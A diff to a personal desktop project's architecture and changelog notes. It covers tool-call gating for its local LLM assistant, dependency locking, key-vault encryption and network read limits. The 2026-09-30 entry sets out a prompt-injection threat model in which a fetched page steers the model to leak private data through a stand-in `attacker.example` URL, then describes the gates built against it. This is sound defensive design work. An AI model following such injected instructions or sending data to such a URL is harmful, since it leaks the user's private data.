@@ -6,8 +6,9 @@ The patterns every module follows, and the deliberate exceptions. If you're abou
 to add a tool, a panel, or a config file, read the relevant section first — the
 goal is that a new module looks like it was always here.
 
-Companion to [`README.md`](README.md) (what the project is) and
-[`CHANGELOG.md`](CHANGELOG.md) (dated history). Per-module detail lives in each
+Companion to [`README.md`](README.md) (what the project is),
+[`CHANGELOG.md`](CHANGELOG.md) (dated history) and
+[`BACKLOG.md`](BACKLOG.md) (known, not done yet). Per-module detail lives in each
 module's own docstring, indexed at
 [`README_PANTHEON/`](metis_toolbox/README_PANTHEON/README.md).
 
@@ -216,6 +217,11 @@ committing one.
   `str.split(" | ")` — no regex.** Don't change the delimiter or column order
   without updating `emanon._parse_line` in lockstep (`metis_logging._DELIM` and
   `emanon._DELIM` must match exactly).
+- **One record, one entry.** The formatter writes a message on one line (its
+  line breaks escaped) and turns ` | ` into ` ¦ ` on the lines after a
+  record's first (a traceback), so text quoted from a server can't start a line
+  Emanon reads as an entry. Emanon splits with `str.splitlines()`; a test holds
+  the formatter's list of breaks to it. Why: §12, 2026-10-05.
 - **Levels carry meaning Emanon collapses into a health verdict:**
   `ERROR`/`CRITICAL` → *failed*, `WARNING` → *degraded*, `INFO` → *nominal*. So
   routine heartbeat is **DEBUG** — it would drown Emanon at INFO. **WARNING** is
@@ -244,6 +250,11 @@ committing one.
 - A **pile-up guard** means a slow worker never stacks: if last tick's fetch is
   still alive, this tick skips it.
 - Workers write **only** to the queue. They never touch a Tk object. Ever.
+- **Workers may share state with each other, never with the main thread.**
+  Kairos's worker and Pythia's worker both reach the freshness caches in
+  `tools/aura.py` and `tools/pheme.py` (§12, 2026-09-28). That is allowed
+  behind the module's own lock, and the cache stores and hands out deep copies
+  only, so a panel never receives an object a worker still holds.
 - On `fetch()` failure Kairos delivers `data=None`; **every `update(data)` must
   handle `None`** (show stale/idle, don't blank-and-crash).
 - Register a worker by adding `(name, interval_seconds, "tools.x.fetch")` to
@@ -301,13 +312,23 @@ guard only covers a callback that is already mid-flight (a glyph destroyed
 while the panel lives); it can do nothing once the panel itself is gone.
 Cancelling the pending id is the only thing that actually ends the chain.
 
+Cancelling first still leaves one gap: Tk can deliver an event *while*
+`super().destroy()` tears the children down — after your cancels, before
+tkinter deletes the callbacks — and a handler that arms a timer then orphans
+it. `winfo_exists()` is still true there, since the children go first. So a
+handler that arms a timer from an event Tk raises on its own (`<Configure>`)
+returns early on a `_destroyed` flag that `destroy()` sets as its first line
+(`ArtemisPanel._on_configure`).
+
 Two shapes, picked by how many can be outstanding at once:
 
 - **One at a time** → a single `self._xxx_after_id` attribute (`EchoPanel`'s
   drain, `HomePanel`'s poll). Re-arm through a helper that
   cancels the stored id first: a callback can be entered *without* its timer
   having fired — the smoke tests call `panel._poll()` directly — and re-arming
-  blind orphans an id that `destroy()` can then never reach.
+  blind orphans an id that `destroy()` can then never reach. A chain that can
+  also *end* inside the callback cancels at the top instead, so the ending
+  branch cannot orphan it either (`ArtemisPanel._drain`).
 - **Several at a time** → a `self._pending_after` set plus an `_after_once()`
   helper that discards its own id when it fires (`MorpheusPanel`,
   `OrpheusPanel`, where every armed remove glyph owns its own confirm window).
@@ -405,6 +426,23 @@ If the module is deliberately **not** a brain tool (§2), it is simply left out 
 truth**; anything restating it is a copy that will drift, so don't add one.
 `tests/test_pantheon_docs.py` enforces that the module docs stay in step.
 
+**The schema is enforced, not just shown.** Every call passes
+`pythia._check_arguments` before its handler runs, driven by the same
+`parameters` object the model read (§12, 2026-09-27). An undeclared or missing
+parameter, or a value of the wrong type, comes back as `bad_arguments` and the
+handler never runs; a numeric string or an enum value in the wrong case is
+normalized. Enum membership and ranges stay the handler's to judge. So a
+handler can trust the *types* the schema declares, and must still check its own
+meaning (Ammit still refuses a start with no usable duration).
+
+**Some calls need more than a valid shape.** After the argument gate,
+`pythia._gate` applies two rules (§12, 2026-09-30). `fetch_page` runs only on a
+URL the user wrote or a `search_web` result gave. A tool that changes files runs
+only after the user says yes through `ask(on_confirm=)`, and never for a caller
+that has no one to ask. **A new tool that changes files joins
+`pythia._CONFIRM_TOOLS`.** `test_pythia_guard` fails if an archive writer is
+missing from it, or if a name in it stops being registered.
+
 Pythia is the **only** registry. A second, voice-side registry existed until
 voice input was retired (§12); `metis_toolbox/__init__.py` is now an empty package
 marker. Keeping a tool off the LLM surface means keeping it out of
@@ -420,7 +458,9 @@ marker. Keeping a tool off the LLM surface means keeping it out of
   event log into positions/totals rather than storing balances — the log is the
   source of truth.
 - **Atomic writes**: tempfile in the same directory + `os.replace`, so a crash
-  mid-write can never truncate the original.
+  mid-write can never truncate the original. `tests/test_file_writes.py` fails
+  on a new function that writes content where it stands, until it says why a
+  torn file is harmless there.
 - **Personal data is gitignored.** `.gitignore` is the list; committed JSON is
   *config* (§4), generated or personal JSON is *state* and stays local.
 
@@ -480,6 +520,38 @@ marker. Keeping a tool off the LLM surface means keeping it out of
 - **No new pip dependencies casually.** The bar is high; Morpheus added *zero*
   (it shells out to binaries instead of importing a library). Prefer stdlib;
   prefer a bundled binary in `bin/` over a package when a binary will do.
+- **Dependencies are a lock, on one Python (3.13).** `requirements.in` says
+  what we use; `requirements.txt` is compiled from it, with every package,
+  direct or pulled in, pinned and hashed. It is generated, never edited by hand.
+  `requirements-dev.in` → `requirements-dev.txt` do the same for mypy and its
+  stubs, constrained to the runtime lock. To add, remove or upgrade a package:
+  1. Edit the `.in` file.
+  2. Recompile on 3.13 with pip-tools (installed in its own venv, never
+     `.venv`): `pip-compile --generate-hashes --strip-extras requirements.in`,
+     then the same for `requirements-dev.in`, since it reads the runtime lock.
+     Add `--upgrade` to refresh every pin. Set `CUSTOM_COMPILE_COMMAND` to
+     that same command first: the header must name the real command, and
+     pip-tools 7.6.1 writes a stray `--no-index` there otherwise.
+  3. Rebuild `.venv` from the lock (SETUP §2) and run the suite.
+
+  Never `pip install` into `.venv` by hand: `test_environment_lock` fails on
+  anything the lock doesn't name, and on any other Python. Why: §12, 2026-09-30.
+- **CI's Actions are pinned to a full commit SHA**, with the release tag in a
+  comment (`uses: actions/checkout@<sha> # v7.0.1`). `test_ci_pins` holds it.
+  Dependabot (`.github/dependabot.yml`) opens one weekly PR that moves every
+  pin with a release at least a week old; merge it once its CI is green.
+- **Every process launch and shell opener is listed** in
+  `tests/test_process_launches.py`, with the program and where each argument
+  comes from. A new one fails until someone traces its arguments and adds its
+  line; then run the semgrep tripwire (`tests/semgrep/felhaven_sinks.yml`). A
+  value that came from the network, a config file or the model must be checked
+  before it reaches the program. Why: §12, 2026-10-03.
+- **Every file write, move and delete is listed** in
+  `tests/test_file_writes.py`, with the folders it writes in and where its
+  path comes from. A new one fails until someone traces its path and adds its
+  line. A path built from the network, a config file or the model must be
+  checked before anything is written, and a function that hands its path in
+  from a caller lists that caller. Why: §12, 2026-10-05.
 - **Hide console windows** when spawning external processes:
   `creationflags=subprocess.CREATE_NO_WINDOW`, referenced defensively
   (`getattr(subprocess, "CREATE_NO_WINDOW", 0)`) if the module might be imported
@@ -1743,3 +1815,733 @@ and when, one line per change, so a decision worth keeping must be written here.
   declared identity in `_SAME_AS`. Inverse video made every selection the
   brightest block on screen, and the badge pair was 1.2:1 against the field,
   too faint to see what was selected. *(2026-09-27.)*
+- **Every tool call passes a schema-driven argument gate
+  (`pythia._check_arguments`), and it rejects less than it could.** Before it,
+  `_dispatch` called `fn(**arguments)` raw: "weather in Pittsburgh" made the
+  model invent `location` and get `tool_failed: … raised TypeError`, which names
+  nothing it can fix, and `calculate(ans="3")` evaluated `'3' * 2 == '33'`. The
+  rule is *reject what no handler could interpret* (undeclared or missing
+  parameters, wrong types, NaN), with a `bad_arguments` detail that says what to
+  send instead and, for a missing parameter, quotes its own description;
+  *normalize what is unambiguous* (numeric strings, enum case, JSON-string
+  arguments, `null` = not given); *leave meaning to the handler*. That last part
+  deviates from the V0.03 audit's T3 twice, on purpose. **Enum membership is not
+  enforced**: every enum handler already refuses an unknown value with its own
+  slug, and Daedalus deliberately resolves names its enum does not list (sidebar
+  names, `tools/aura.py`), which strict rejection would break. **Ranges are not
+  enforced**: Morpheus clamps a volume of 150, and a refusal costs gemma4:e2b a
+  retry, the step it is measurably weakest at. The audit's T4 check
+  ("required ⇒ no handler default") was dropped too: once the gate refuses a
+  missing required argument, those defaults are unreachable from the model, so
+  the test would guarantee the same thing twice. A handler with no registered
+  schema (a test's injected fake) passes ungated. *(2026-09-27.)*
+- **A tool that returns long text has a model-facing budget separate from any
+  storage cap.** `read_document` returned a whole file up to Herodotus's 1 MB
+  storage cap (~250k tokens against the context window). It now returns
+  `_READ_CHARS` (6000) per call with `truncated` + `next_offset` and takes an
+  `offset`, the `fetch_page` pattern. Its description steers partial changes
+  to `edit_document`, because a model that rewrote a document from a truncated
+  read would silently cut it. `ask()` also logs any result over
+  `_LARGE_RESULT_CHARS` (8000), set above both budgets (the audit's 2000 would
+  fire on every normal fetch), so the next unbudgeted tool shows up in the log
+  before it shows up as a broken turn. *(2026-09-27.)*
+- **Aether probes the internet and the local Ollama, not Anthropic's status
+  page.** The Statuspage check was a leftover of the retired Claude-API brain,
+  and `get_connectivity` told the model it answered "whether Claude is online".
+  The internet probe is Windows' own NCSI page, plain HTTP with redirects not
+  followed, so a captive portal reads as `limited`, not `online`. The Ollama
+  probe derives `OLLAMA_HOST` the same way `pythia._BASE_URL` does, held in
+  lockstep by a test rather than an import (tools/ must not import the brain).
+  The poll went from 3600 s to 300 s: hourly suited a remote status page, but an
+  hour-old "the internet is up" misleads, and both probes are cheap.
+  *(2026-09-27.)*
+- **`num_ctx` 8192 → 16384.** 8192 was never breached: 0 of 2,737 logged Ollama
+  requests (Sep 15–27) truncated, largest prompt 6,558. But the ~4.9k-token
+  schema prefix left thin headroom for a long tool result, and every new tool
+  grows it. 32768 was measured at +0.02 GB of VRAM with flat speed
+  (2026-07-31), so this is headroom bought nearly free. `_MAX_HISTORY_TURNS` is
+  unchanged: this is room for results and tools, not longer memory.
+  *(2026-09-27.)*
+- **The Tool Broker (per-turn tool selection) is parked, not rejected.** The
+  V0.03 audit proposed sending only the relevant domains' schemas each turn,
+  since every turn pays for all 23 (~4.9k tokens, Daedalus alone 37%). Three
+  measurements say not yet. (1) Nothing overflows (the entry above). (2) The
+  prefix cache is working: 147 of 153 chat-sized prompts reused it (~1.1 s
+  prefill) against 6 misses (~12 s). gemma4's built-in renderer declares tools
+  *ahead of* the history, so a tool list that changes with the topic
+  re-prefills everything behind it at ~3.2 ms/token. (3) Its `find_tools`
+  fallback asks the model to notice a gap and make a second call, the chaining
+  gemma4:e2b was measured failing (2026-07-31), so a keyword miss would mostly
+  go unrecovered. **Revisit when** the fixed prefix nears ~6–7k tokens, a
+  routing miss shows up in the Rite Log, or a model that chains reliably
+  replaces gemma4:e2b. The full design is kept out of repo at
+  `D:\metis\PYTHIA_TOOLS_AUDIT_V003.md`. *(2026-09-27.)*
+- **Polled brain tools answer from their last good fetch, dated with `as_of`
+  (V0.03 audit T7 / M2).** Kairos polled Aura every 30 min, yet
+  `get_weather`, `get_sun_times` and `get_moon_phase` each fetched again.
+  "Weather, sunset and moon?" was three round trips, and six GETs offline,
+  where each walked both of Aura's sources. Now `handle()` answers from the
+  last good fetch while it is younger than `CACHE_TTL`, set to the Kairos
+  interval (Aura 1800 s, Pheme 900 s), so in steady state Pythia rides the
+  poll. `fetch()` still always goes to the network and still raises: a poll
+  that answered from the cache would stop raising, and Kairos's retry ladder
+  would never engage. The cache is keyed on whatever shapes a result (Aura:
+  location, lat and lon, but **not** units, since every reading carries °F and
+  °C; Pheme: the feed config), and a stale reading is never served across
+  keys. One lock per module is held *across* the fetch. The usual rule against
+  that is about stalling threads that want something else; the only threads
+  waiting here want that fetch's result, and no main-thread code takes the
+  lock (§6). After a failed refresh the last reading comes back marked
+  `stale: true` for up to 2 × TTL, its `as_of` unchanged. A failure is not
+  retried for 60 s (`_RETRY_AFTER`), so an offline turn is one attempt.
+  Helios and Selene still call `aura.handle()`, which *is* the cache read now.
+  That departs from the audit's wording ("instead of calling `handle()`") but
+  not its intent, and it keeps `test_tool_handles`' mock seam. The pattern
+  lives in two deliberately parallel copies, with Aura as the reference. A
+  third polled tool adopting it is the point to extract a helper. Aether stays
+  live on purpose: "is the internet up?" wants now, not up to 5 minutes ago.
+  *(2026-09-28.)*
+- **gemma4:e2b does not relay `stale`, so the 2 × TTL bound is the real
+  guard.** Measured 2026-09-28 with the owner's Machine Spirit override and a
+  45-minute-old reading behind a failed refresh. The model called it "the
+  current weather" 3 of 3 times. It did the same with a sentence added to
+  `get_weather`'s description (3/3), and with a plain-prose `note` in the
+  result (1/1, confirmed delivered). So no tool description was changed, and
+  `stale` stays as data for the Rite Log and for a model that reads it. The
+  harm is bounded: in normal operation a reading up to 30 minutes old is
+  already narrated as current, and a failed refresh stretches that to at most
+  an hour, never to yesterday. To make Pythia say so aloud, probe a Machine
+  Spirit rule or a bigger model, not the schema. *(2026-09-28.)*
+- **Helios and Selene compute the sun and moon locally, always, not as a
+  fallback (V0.03 audit M3).** They used to interpret Aura's fetched
+  `astronomy` dict, so no network meant no sunset and no moon, and Aura's
+  Open-Meteo fallback carried no moon at all. Both are now arithmetic on the
+  Settings location and the clock: NOAA's solar equations for the sun, the
+  Astronomical Almanac's low-precision lunar series for the moon. They were
+  checked against USNO and JPL Horizons values retrieved 2026-09-28, and every
+  rise and set came within a minute. *Always*, because then one function feeds
+  both the tool and the panel. As a fallback, the times would jump a minute
+  each time wttr.in came and went, and the cached tool and the polled panel
+  could briefly disagree. The consequences are deliberate:
+  (1) **No `as_of`.** T7 dates a fetched reading, and a value computed during
+  the call is as old as the call, as with Horai. This supersedes "Helios and
+  Selene still call `aura.handle()`" in the freshness entry above.
+  (2) **Times are in this computer's zone**, not the location's. Stdlib Python
+  on Windows has no time-zone database (`zoneinfo` needs `tzdata`, §11), and
+  Horai and `pythia._now()` already treat the machine clock as the user's. It
+  only shows when the Settings location is in another zone.
+  (3) **Each has its own Kairos worker** (`fetch = handle`, never raises,
+  300 s). The two sub-widgets register with it directly, and so does
+  Hypatia's moon row, as a rider. A weather outage no longer blanks any of
+  them.
+  (4) **Kepler's Earth elements were not reused for the sun.** Kepler
+  documents ~1° in the J2000 frame, which is ~4 minutes of sunrise; reuse
+  needs a matching precision contract. Selene does reuse `hypatia._altaz` and
+  Helios's sun, the Kepler sibling-import pattern above.
+  (5) **Phase names follow USNO's rule, found from its data rather than
+  assumed.** Round the illumination to a whole percent: 0 is new, 100 full, 50
+  a quarter, anything else crescent or gibbous. So a quarter is named only in
+  the hour or so around it, and the name always matches the percentage beside
+  it.
+  (6) **Aura's `astronomy` block stays in `get_weather`'s output**, though no
+  panel reads it now. Removing it changes what the model sees, and that wants
+  a probe first. Until then the model can see wttr.in's sunrise beside
+  Helios's, usually within a minute. *(2026-09-28.)*
+- **§3's logger rule is a test now (`test_tool_loggers`, V0.03 audit L5).**
+  Every `tools/` module declares its own module-level `METIS.<name>` logger.
+  A sentence in §3 had not kept helios, selene and horai from going without
+  one. Horai stays on the allowlist, because it reads only the clock and
+  Themis and has no failure path to log. Whether that earns a written
+  exemption or a logger is still open, and the allowlist fails if the entry
+  goes stale. *(2026-09-28.)*
+- **`BACKLOG.md` is the one home for things found but not fixed.** Before it,
+  open items were spread across the audit doc's "not done" lists, dated
+  handoffs, "revisit when" lines here, "flagged, not fixed" notes in
+  docstrings, and session memory the owner never sees. Each of those was a
+  copy, and copies drift. It lives in the repo, not beside the handoffs in
+  `D:\metis\`, because the commit that fixes an item deletes its line; an
+  out-of-repo list can't be tied to the fix, so it goes stale. There is no
+  "done" section, because CHANGELOG is the record of fixes. Reasoning stays
+  here and the backlog links to it. **Security issues never go in it.** One
+  found in any session is fixed in that session, no exceptions (the owner's
+  rule). That also suits a file the public snapshot publishes.
+  `test_backlog_format` holds its shape. *(2026-09-29.)*
+- **Pythia's dispatch gate: provenance for URLs, a yes for file changes, and
+  public addresses only.** Pythia reads text strangers write (news, search
+  results, pages, song titles, and notes that began as any of those). She can
+  reach private data. And she holds tools that send data out (`fetch_page`) or
+  keep it (`write_document`, `edit_document`). Until now, only the model's
+  judgement stopped a page from telling her to read something private and fetch
+  `https://attacker.example/?d=<it>`. That is a defence that is difficult to
+  beat, not expensive, and a model that follows instructions better weakens
+  it. So the rules sit in `_dispatch`, where no text can argue with them.
+  (1) **`fetch_page` opens only a URL the user wrote or a `search_web` result
+  gave**, anywhere in the history the model can see. The match is exact, not a
+  substring: a substring would let the model pick a length, and a length is a
+  number. Links inside fetched pages and news stories are not trusted. A page
+  can offer hundreds, and which one the model picks is itself a message. It is
+  provenance rather than a question because search then fetch is the tool's
+  everyday path, and a question on every fetch is one the owner would learn to
+  click through. Search results can still be steered by someone who
+  pre-indexes a page for every value they hope to learn. That costs money and
+  time, which is the bar.
+  (2) **Every archive write or edit asks first, always.** The first design
+  asked only after untrusted text had been read. Saves are rare and most follow
+  a web search anyway, so it would have asked about the same saves, while
+  adding a list of "untrusted" tools that could silently miss one. The question
+  shows every argument and the whole content, untrimmed, because the end of a
+  note is where a hidden line would go. It fails closed. No `on_confirm`, an
+  error, anything but `True`, Stop, Refresh, or ten minutes without an answer
+  all mean no. A no is final for the rest of the turn, so a model that retries
+  is refused without asking again. A question repeated until the user clicks
+  Allow to make it stop is not a control. The answer crosses main→worker as an
+  Event, the crossing `cancel` already makes.
+  (3) **Callimachus connects to public internet addresses only.** The check is
+  in the connection, not the URL. The host is resolved once, and every answer
+  must be public (`is_global`, not multicast, with an IPv4 address inside an
+  IPv6 one unwrapped). The checked IP is the one dialled, while TLS still
+  verifies the name. That covers every redirect hop and leaves DNS rebinding
+  nothing to change. Proxies from the environment are off, because through a
+  proxy the check would see the proxy. A URL the user typed is refused too:
+  Callimachus can't know who wrote it, and a router page belongs in a browser.
+  `search_web` shares the opener, which is harmless because Brave is public.
+  A SearXNG on Obelisk would need an opener of its own.
+  **Left as they are:** `search_web` and `play_music` queries can still carry
+  private text to Brave and YouTube, but those are third parties, not the
+  attacker. Delimiters around tool output were not added: they can help a
+  model, but they are not a control. *(2026-09-30.)*
+- **One Python, one hashed lock, and CI builds from it.** Obelisk's venv had
+  drifted to 121 packages for the five `requirements.txt` named. Most were
+  leftovers from retired features (faster-whisper, torch, spaCy, pandas), none
+  imported, several with published advisories. Nothing pinned what
+  "installed" meant, so each CI run resolved the newest of everything while
+  Obelisk ran whatever had piled up. CI's 3.10 leg, CI's 3.13 leg and Obelisk
+  (3.11) had three different onnxruntimes, and the one that runs was tested by
+  none of them. Now the lock names 22 packages.
+  (1) **A lock with hashes, installed with `--require-hashes
+  --only-binary=:all:`.** Pins make every install the same versions. Hashes
+  make it the same *files*, so a replaced upload or a tampered cache is refused
+  instead of installed. pip checks its own cache too; that was tested by
+  changing a hash. Wheels only, because building from source runs the
+  package's build code at install time and needs build tools the lock doesn't
+  list. Every locked package has a Windows wheel, so today that costs nothing.
+  (2) **The venv must equal the lock** (`test_environment_lock`). A lock
+  nobody checks is only a comment: the drift above came from hand installs.
+  Two states are allowed. The runtime lock alone is CI's test job, and it
+  proves nothing else is needed. Runtime plus dev is the lock with mypy, for
+  local type checks. `pip` is the only extra. The test runs in CI inside a venv
+  built from the lock, so CI tests what runs.
+  (3) **Python 3.13: not 3.14, and no longer 3.10.** On Windows, a Python line
+  gets installers only while it takes bugfixes. After that its security
+  releases are source-only, which is how Obelisk sat on 3.11.9 with a
+  January 2024 OpenSSL. 3.14 has the longest window left, but kokoro-onnx
+  declares `<3.14`, and pip doesn't refuse it: it quietly installs kokoro-onnx
+  0.4.7 from April 2025, plus 19 more packages. With the lock, that is now a
+  loud error instead. 3.13 is supported, but its bugfix window closes
+  2026-10-01, so it is a stopgap with a known end; BACKLOG parks the move.
+  3.10 is gone for three reasons. The lock can't install there (onnxruntime
+  needs 3.11, numpy 3.12). Its CI leg ran 3.10.11 from April 2023 with
+  packages nobody else ran. And it reaches end of life 2026-10-31. "3.10+" was
+  the oldest Python the code parses on, not one anyone used.
+  (4) **Actions pinned to SHAs** (`test_ci_pins`). A tag is a pointer its
+  owner, or anyone who takes over the repository, can move. A SHA is the code
+  that was read. The tag stays as a comment so a reader can see the release.
+  `persist-credentials: false` because no job pushes, so the token has no
+  reason to sit in `.git/config` while test dependencies run.
+  **What watches it:** a lock is clean the day it is made and goes stale by
+  design. Dependabot alerts are on for this repository and read the lock's
+  exact versions; an alert is the cue to recompile. The Action pins have no
+  watcher yet (BACKLOG). *(2026-09-30.)*
+- **Dependabot moves the Action pins; the Python lock stays a hand job.** A
+  SHA pin never moves, so on its own a pinned Action only gets older.
+  `.github/dependabot.yml` checks weekly and opens one PR for every Action
+  with a release, updating each SHA and its tag comment together. That PR
+  runs CI like any push, `test_ci_pins` included, and is merged only once
+  green. **Cooldown, 7 days:** a release is proposed only once it is a week
+  old. A hijacked release is usually noticed and pulled within days, so one
+  would have to survive a week in public to reach this repo. The cost is
+  waiting a week for ordinary fixes; an urgent one can be applied by hand.
+  **Actions only, not pip:** Dependabot could regenerate the pip-compile
+  lock, but on its own runner, not on 3.13 under Windows with §11's
+  command. So the lock is recompiled by hand, cued by Dependabot's alerts.
+  *(2026-09-30.)*
+- **Cerberus v2: the keys are encrypted to the Windows account, and the PIN
+  decrypts nothing.** This replaces the crypto in the 2026-07-06 entry. v1
+  derived the vault key from a four-digit PIN with PBKDF2, and kept a fast
+  salted hash of the PIN beside it, so all 10,000 PINs fell in milliseconds and
+  the slow KDF never mattered. The PIN had also been published as a test
+  fixture, so a copy of the vault file was a copy of the keys. The owner keeps
+  the PIN as the everyday gate (a child lock; Pythia reporting tickers must not
+  need more), and anything encrypted under it would be unprotected at rest by
+  design. So the two jobs were split.
+  (1) **At rest: Windows DPAPI**, current-user scope, through ctypes (stdlib,
+  no new package), with the entry name as DPAPI's optional entropy. A copied
+  vault file is useless on another account or PC, a blob moved to another
+  entry fails, and nobody types anything. A wrong name, a changed byte and a
+  cut-short blob all fail with WinError 13 (measured). The cost, written in
+  `SECURITY.md`: anything running as the user can decrypt at any time. That
+  was already true of v1, with its PIN public.
+  (2) **The PIN is a policy gate.** It opens the session that lets tools use
+  the keys and the UI change them. It decrypts nothing, so its being public
+  exposes no secret, its fast hash guards nothing worth slowing down, and
+  changing it touches no key (v1's `setpin` orphaned the vault). The
+  three-tries lockout stays, as child-lock theater.
+  (3) **No cipher of our own, so no `cryptography` package.** The hand-built
+  HMAC counter-mode cipher is gone, and §11's bar on new packages is untouched.
+  (4) **A passphrase vault is parked** (BACKLOG) until the holdings ledger
+  holds real data, the only thing today that would need more than DPAPI.
+  (5) **It locks on exit, on a Windows lock, on sleep, and after an hour with
+  no input anywhere on the PC.** Windows announces a lock or a sleep only to a
+  window procedure, and Tk doesn't expose one: hearing it would mean patching
+  Tk's window through ctypes, or a hidden window on a message-loop thread of
+  our own. Instead `tools/hypnos.py` reads three values, and Cerberus's own 2 s
+  Kairos worker (`cerberus.fetch`) locks on the worker thread, so the keys stop
+  working before any panel redraws. At worst it is 2 s late, while the screen
+  is locked or still waking. Sleep has two signals (an "asleep" counter, and a
+  gap between checks) because Obelisk had never slept, so the first couldn't be
+  measured. Idle is whole-PC, not Felhaven-only: working in another app isn't
+  being away.
+  (6) **The session is shared with the main thread, behind its own lock**: a
+  second channel §6 doesn't name, like the Ledger (2026-07-24). The lock is
+  held across a whole read, so once `lock()` returns no read is still in
+  flight. Session before Ledger, always.
+  (7) **Tampering is loud.** An old-format or unparseable vault file, a key
+  that won't decrypt, and a PIN file recreated while the vault held keys each
+  write a Ledger row and an ERROR (Emanon), and raise an alarm the worker
+  carries to the CERBERUS tab's banner, the Dynastic Vault and Home's lamp.
+  Unlocks, wrong PINs and locks (with why) are Ledger rows too. An attacker who
+  has to be seen pays more. An old vault is renamed aside in the tab, never
+  deleted.
+  (8) **Custody opens only listed `.json` files inside `config/`.** The path is
+  resolved with links followed, then checked with `is_relative_to` against a
+  constant in the code, not the manifest's own `config_dir`: the manifest is
+  editable through Custody, and `os.startfile` RUNS an `.exe`, `.bat` or `.lnk`.
+  (9) **Secrets only at hidden prompts.** The CLI reads PINs and keys with
+  `getpass` and refuses them on the command line, because shell history keeps
+  every command. `get` is gone: it printed a key into the terminal.
+  (10) **Fixtures say "fake".** In a test that touches Cerberus, every PIN and
+  value literal contains "fake", and no tracked literal anywhere has an API
+  key's shape (`tests/test_secret_fixtures.py`). A published fixture is public
+  for good, and a real PIN was one.
+  **Left as they are:** anyone at the keyboard can edit the PIN file and the
+  Ledger, so the tamper signals raise the cost in exposure, not a wall.
+  *(2026-09-30.)*
+- **`morpheus.describe()` takes only a YouTube watch URL, rebuilt from its id,
+  after `--`.** Its `url` is network data: a search row's `"url"`, from yt-dlp's
+  own JSON. yt-dlp builds that field from the video id today, so no uploader we
+  know of can make it start with `-`, but nothing else stopped a value that did
+  from being read as an option. So the URL must fully match
+  `https://(www.)?youtube.com/watch?v=<11 id characters>`, yt-dlp gets the URL
+  rebuilt from that id, and `--` goes before it. Anything else is
+  `describe_failed` before a process starts, and Awen already treats that as no
+  evidence. Three details: (1) **`fullmatch`, not `^...$`.** In Python `$` also
+  matches before a final newline, and a test now holds that. (2) **Checked
+  against the real `bin/yt-dlp.exe` (2026.08.19):** after `--`, even
+  `--version` is reported as "not a valid URL" (exit 1), not run. (3) **mpv's
+  own path to yt-dlp already does this:** the `ytdl_hook` script built into
+  `bin/mpv.exe` inserts `--` before the URL (read from the binary, 2026-10-01),
+  and mpv only hands http(s) and `ytdl://` URLs to it. `search()` needs no
+  `--`: its argument always starts `ytsearch`. *(2026-10-01.)*
+- **Network reads go through `tools/hermes.py`: a byte cap, and a deadline
+  for the whole request.** `timeout=` in requests and urllib bounds each socket
+  operation, so a server that sends one byte every few seconds never trips it,
+  and a body of any size was read into memory. Aura and Pheme hold their cache
+  lock across a fetch, so one stuck read also stalled Pythia's weather and
+  news. Decisions, each confirmed by the owner:
+  (1) **The deadline lives in the socket.** Before every connect, TLS
+  handshake, send and recv, the socket's timeout is set to min(per-op timeout,
+  time left): a socket subclass for plain TCP, and `SSLContext.sslsocket_class`
+  for TLS. A check between body chunks would miss a server that drips its
+  HEADERS, and a watchdog thread would leave a stuck read holding Aura's lock;
+  here the read ends in the thread that asked. The one gap: the DNS lookup,
+  which can't be interrupted. (CPython already runs a whole TLS handshake
+  against one socket timeout, so a dripped handshake was never unbounded; the
+  deadline only makes it smaller.)
+  (2) **stdlib, not requests.** requests gives no hold on its sockets, and
+  decodes gzip on its own, which makes "bytes held" differ from "bytes
+  counted". Hermes asks for `Accept-Encoding: identity` and refuses a
+  compressed answer; measured 2026-10-01, no provider we read compresses when
+  asked not to. requests stays only for Pythia's Ollama stream and the dev
+  catalog script.
+  (3) **Every call states its own cap; there is no default.** A default is an
+  unmeasured number that silently applies to the next caller. Each cap is a
+  module constant with its measured size and date beside it: 4x the largest
+  measured body, rounded up to a power of two, never below 64 KiB for a live
+  response (so an error page can't become TooLarge); 1.5x the largest file in
+  the vintage for a fixed census file. The deadline is one rule,
+  `deadline_for()`: twice the per-op timeout, or the time to read the whole
+  cap at 100 kB/s, whichever is longer.
+  (4) **https only, and a redirect may not leave https.** requests and
+  urllib's default handler both follow a redirect from https down to http,
+  which hands the fetch to anyone on the path; only Callimachus refused it.
+  `allow_http=True` is the per-call exception (Aether's probe, the local
+  Ollama server). No proxies from the environment. Other schemes are refused
+  before urllib's file:, ftp: and data: handlers can see them.
+  (5) **One error vocabulary**, and no message ever carries the URL (Midas's
+  key travels in the query). `Timeout` is also a `TimeoutError`, so code that
+  already catches `socket.timeout` needs no new arm.
+  (6) **Proven on a real loopback server** (`tests/_loopback.py`): dripped
+  headers, a dripped body, a dripped TLS handshake and a stalled body each end
+  at a 1 s deadline. A real TLS server would need a certificate, which the
+  repo can neither mint nor should publish, so the TLS read path past the
+  handshake is tested on an unhandshaken socket, whose read performs the
+  handshake. Found while writing that test: an `https_open` override never
+  passes the handler's `context=` to its connection class, so the connection
+  sets the context itself.
+  `tests/test_network_reads.py` holds the line: a runtime module that imports
+  a network library itself fails, unless it is in `_ALLOWED` with a reason or
+  on `_NOT_YET_MIGRATED`, which shrinks one module per commit. *(2026-10-01.)*
+- **Callimachus keeps its own opener; hermes only bounds it.** Its opener is
+  the address guard (public internet only, the name resolved once and that IP
+  dialled, a redirect checked hop by hop), and routing it through `hermes.get`
+  would have meant re-plumbing a security control to gain nothing. So the
+  guard stays as it was and hermes wraps around it: `bounded_dial()` around
+  `_connect_public` (the same addresses, checked the same way, now handing back
+  a deadline-aware socket), `hermes.TLS_CONTEXT` on the guarded connection, and
+  `_fetch_bytes` inside `hermes.within()` with `hermes.read_bounded()`.
+  `search_web` had no cap at all; it now has 64 KiB (Brave's answer measured
+  10,334 B at count=3, 2026-10-01). A deadline cut arrives as a
+  `TimeoutError`, so the existing `timeout` arms map it with no new code.
+  Every address-guard test passes unchanged. *(2026-10-01.)*
+- **Demeter's cap is computed from the box, not fixed.** An OpenTopography
+  grid's size follows the area asked for and the latitude (a degree of
+  longitude shrinks toward the poles), so one number would be either too
+  tight in the north or loose everywhere else. `grid_cap(box)` is the cells a
+  1/3 arc-second grid needs to cover the box, times the longest value
+  measured plus its separator (19 bytes), times 1.5, plus a header allowance.
+  Measured 2026-10-01 on two 0.01-degree boxes: OpenTopography writes
+  full-precision floats, up to 18 characters, so a value's length follows its
+  digits, not its height (17.99 bytes a cell at ~560 m, 16.29 at ~4,300 m). A
+  full Artemis box at 39 N is ~3.8 M cells: a real download of ~69 MB against
+  a cap of ~109 MB, and a deadline of ~18 minutes by hermes' rule. Every
+  ingest logs the bytes received against the cap, so a real download keeps
